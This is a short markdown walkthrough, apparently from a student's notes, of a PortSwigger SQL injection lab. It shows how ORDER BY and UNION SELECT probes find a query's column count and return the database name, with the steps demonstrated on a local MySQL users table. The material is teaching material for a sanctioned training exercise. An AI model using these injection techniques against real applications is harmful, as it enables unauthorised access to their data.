### Third Exercise 👆


![problem.PNG](/assets/SQLi/Third/problem.PNG)

#### **To do**

```
To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.  
```


1. Try to guess number of columns with `order by <n>`

```bash
mysql> SELECT * FROM users;
+-------+-------------------------+
| user  | password_hash           |
+-------+-------------------------+
| admin | 21312k3n2lhkgheksfesfes |
| josh  | 12321ljrynr8y3oc8       |
+-------+-------------------------+
2 rows in set (0.00 sec)
mysql> SELECT * FROM users order by 3;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

* If you try to `order by` with a number of a any column you receive a message **OK** or **ERROR**
In the example the table only have 2 columns, I try to order by with **3 column** and receive a **ERROR message**


2. Order by correct number of columns
```bash
mysql> SELECT * FROM users order by 2;
+-------+-------------------------+
| user  | password_hash           |
+-------+-------------------------+
| josh  | 12321ljrynr8y3oc8       |
| admin | 21312k3n2lhkgheksfesfes |
+-------+-------------------------+
2 rows in set (0.00 sec)
```

* Now we know how many columns have table: `2`.

In this way we can know the column number of a table. 🔢

3. Use a UNION SELECT to combinate data or get information on database.

```bash
mysql> SELECT * FROM users UNION SELECT 1,1;
+-------+-------------------------+
| user  | password_hash           |
+-------+-------------------------+
| admin | 21312k3n2lhkgheksfesfes |
| josh  | 12321ljrynr8y3oc8       |
| 1     | 1                       |
+-------+-------------------------+
3 rows in set (0.01 sec)
```

**REMEMBER**: `UNION SELECT <n>`, n must be same equal number of columns.
```bash
mysql> SELECT * FROM users UNION SELECT database(),1;
+-------+-------------------------+
| user  | password_hash           |
+-------+-------------------------+
| admin | 21312k3n2lhkgheksfesfes |
| josh  | 12321ljrynr8y3oc8       |
| test  | 1                       |
+-------+-------------------------+
3 rows in set (0.00 sec)
```


4. In case of **PortSwigger** use `UNION SELECT NULL,...,NULL` not use numbers.
![solution.PNG](/assets/SQLi/Third/solution.PNG)